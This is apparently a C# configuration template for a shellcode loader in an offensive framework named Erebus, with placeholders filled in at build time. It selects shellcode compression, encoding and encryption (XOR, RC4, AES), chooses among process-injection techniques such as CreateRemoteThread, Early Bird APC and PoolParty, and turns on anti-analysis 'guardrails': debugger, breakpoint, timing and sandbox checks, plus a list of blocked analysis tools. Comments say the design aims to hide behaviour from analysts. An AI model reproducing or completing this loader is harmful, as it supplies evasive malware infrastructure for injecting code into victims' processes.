using System.Runtime.Versioning;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class InjectionConfig
    {
        // ============================================
        // COMPRESSION CONFIGURATION
        // ============================================

        /// <summary>
        /// Compression format for shellcode:
        /// - 0 = None        - No decompression
        /// - 1 = LZNT1       - LZNT1 compression
        /// - 2 = RLE         - Run-Length Encoding
        /// </summary>
        public static int CompressionType = {{ COMPRESSION_TYPE }};

        // ============================================
        // ENCODING CONFIGURATION
        // ============================================

        /// <summary>
        /// Encoding format for shellcode:
        /// - 0 = None        - No decoding
        /// - 1 = Base64      - Base64 encoding
        /// - 2 = ASCII85     - ASCII85 encoding
        /// - 3 = ALPHA32     - ALPHA32 encoding
        /// - 4 = WORDS256    - WORDS256 encoding
        /// </summary>
        public static int EncodingType = {{ ENCODING_TYPE }};

        // ============================================
        // ENCRYPTION CONFIGURATION
        // ============================================

        /// <summary>
        /// Encryption type for shellcode:
        /// - 0 = None        - No decryption
        /// - 1 = XOR         - Simple XOR cipher
        /// - 2 = RC4         - RC4 stream cipher
        /// - 3 = AES_ECB     - AES in ECB mode
        /// - 4 = AES_CBC     - AES in CBC mode
        /// </summary>
        public static int EncryptionType = {{ ENCRYPTION_TYPE }};
        
        /// <summary>
        /// Select injection method:
        /// - "createfiber"    : Fiber-based self-injection
        /// - "earlycascade"   : Early Bird APC injection (remote)
        /// - "poolparty"      : Worker Factory thread pool injection (remote)
        /// - "classic"        : Classic CreateRemoteThread injection (remote)
        /// - "enumdesktops"   : EnumDesktops callback injection (self)
        /// - "appdomain"      : AppDomain injection for .NET assemblies (self) 
        /// </summary>
        public static string InjectionMethod = "{{ INJECTION_METHOD }}";

        /// <summary>
        /// Target Process ID for remote injection methods.
        /// Set to 0 to create a new process automatically.
        /// Only applies to: earlycascade, poolparty, classic
        /// </summary>
        public static int TargetPID = 0;

        /// <summary>
        /// Target process name for remote injection (when TargetPID = 0)
        /// </summary>
        public static string TargetProcess = "{{ TARGET_PROCESS }}";

        /// <summary>
        /// Encryption key for shellcode
        /// Leave empty for no encryption (matches EncryptionType = 0)
        /// </summary>
        public static byte[] EncryptionKey = new byte[] { {{ ENCRYPTION_KEY }} };

        /// <summary>
        /// IV for AES encrytpion
        /// Leave empty for no encryption (matches EncryptionType = 0)
        /// </summary>
        public static byte[] EncryptionIV = new byte[] { {{ ENCRYPTION_IV }}};

        /// <summary>
        /// Shellcode Byte Array
        /// </summary>
        public static byte[] Shellcode = new byte[] { {{ ENCRYPTION_SHELLCODE }} };

        // ============================================
        // GUARDRAILS CONFIGURATION
        // ============================================

        /// <summary>
        /// Enable/disable guardrails checks
        /// </summary>
        public static bool GuardrailsEnabled = {{ GUARDRAILS_ENABLED }};

        /// <summary>
        /// Runtime debug logging toggle. When true, DebugLogger.WriteLine
        /// emits to stdout regardless of build configuration. Never ship
        /// with this enabled - it gives analysts a clear view of exactly
        /// which guardrail fired.
        /// </summary>
        public static bool DebugLoggingEnabled = {{ DEBUG_LOGGING_ENABLED }};

        /// <summary>
        /// Check if process is being debugged (native IsDebuggerPresent +
        /// managed Debugger.IsAttached).
        /// </summary>
        public static bool CheckDebugger = {{ GUARDRAILS_CHECK_DEBUGGER }};

        /// <summary>
        /// Check for remote debuggers via CheckRemoteDebuggerPresent and
        /// NtQueryInformationProcess(ProcessDebugPort).
        /// </summary>
        public static bool CheckRemoteDebugger = {{ GUARDRAILS_CHECK_REMOTE_DEBUGGER }};

        /// <summary>
        /// Check for debugger / analysis processes in the BlockedProcesses
        /// list below.
        /// </summary>
        public static bool CheckDebuggerProcesses = {{ GUARDRAILS_CHECK_DEBUGGER_PROCESSES }};

        /// <summary>
        /// Check for hardware breakpoints via GetThreadContext against
        /// Dr0–Dr3 and their corresponding enable bits in Dr7.
        /// </summary>
        public static bool CheckHardwareBreakpoints = {{ GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS }};

        /// <summary>
        /// Check for timing anomalies (single-stepping debugger detection).
        /// </summary>
        public static bool CheckTiming = {{ GUARDRAILS_CHECK_TIMING }};

        /// <summary>
        /// Check for sandbox-indicative environment signals (CPU count,
        /// RAM, system-drive size, recent-activity folder population).
        /// </summary>
        public static bool CheckSandboxEnvironment = {{ GUARDRAILS_CHECK_SANDBOX }};

        /// <summary>
        /// Blocked debugger / analysis process names (case-insensitive).
        /// Rendered from BuildParameters at build time. Default set covers
        /// native debuggers, .NET decompilers (dnSpy, dnSpyEx, dotPeek,
        /// ILSpy, JetBrains), process monitors, and traffic inspectors.
        /// </summary>
        public static string[] BlockedProcesses = new string[] { {{ BLOCKED_PROCESSES }} };

        /// <summary>
        /// Whitelisted hostnames (empty = allow all)
        /// </summary>
        public static string[] AllowedHostnames = new string[] { {{ ALLOWED_HOSTNAMES }} };

        /// <summary>
        /// Blacklisted hostnames (empty = block none)
        /// </summary>
        public static string[] BlockedHostnames = new string[] { {{ BLOCKED_HOSTNAMES }} };

        /// <summary>
        /// Blacklisted usernames (empty = block none)
        /// </summary>
        public static string[] BlockedUsernames = new string[] { {{ BLOCKED_USERNAMES }} };

        /// <summary>
        /// Whitelisted IP address prefixes (empty = allow all)
        /// </summary>
        public static string[] AllowedIPs = new string[] { {{ ALLOWED_IPS }} };

        /// <summary>
        /// Blacklisted IP address prefixes (empty = block none)
        /// </summary>
        public static string[] BlockedIPs = new string[] { {{ BLOCKED_IPS }} };

        /// <summary>
        /// Whitelisted domains (empty = allow all)
        /// </summary>
        public static string[] AllowedDomains = new string[] { {{ ALLOWED_DOMAINS }} };
    }
}
